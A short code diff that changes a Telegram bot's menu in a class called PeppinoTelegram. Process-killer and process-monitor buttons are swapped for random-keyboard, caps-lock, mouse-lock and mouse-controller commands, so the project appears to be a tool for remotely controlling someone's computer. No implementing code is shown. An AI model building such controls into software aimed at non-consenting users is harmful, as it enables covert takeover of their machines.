@@ -1723,11 +1723,10 @@ class PeppinoTelegram:
     def menu_input(self):
         buttons = {
             "🔙 Back": "/mainmenu",
-            "🔪 Processkiller": "/processkiller",
-            "🛑 Terminateprocess": "/terminateprocess",
-            "📋 Procmonmenu": "/procmonmenu",
-            "➕ Procmonadd": "/procmonadd",
-            "➖ Procmonrem": "/procmonrem",
+            "🎹 Randomkeyboard": "/randomkeyboard",
+            "🔠 Capslock": "/capslock",
+            "🖱️ Mouselock": "/mouselock",
+            "🎮 Mousecontroller": "/mousecontroller",
         }
 
         if self.mainmenu_ref:
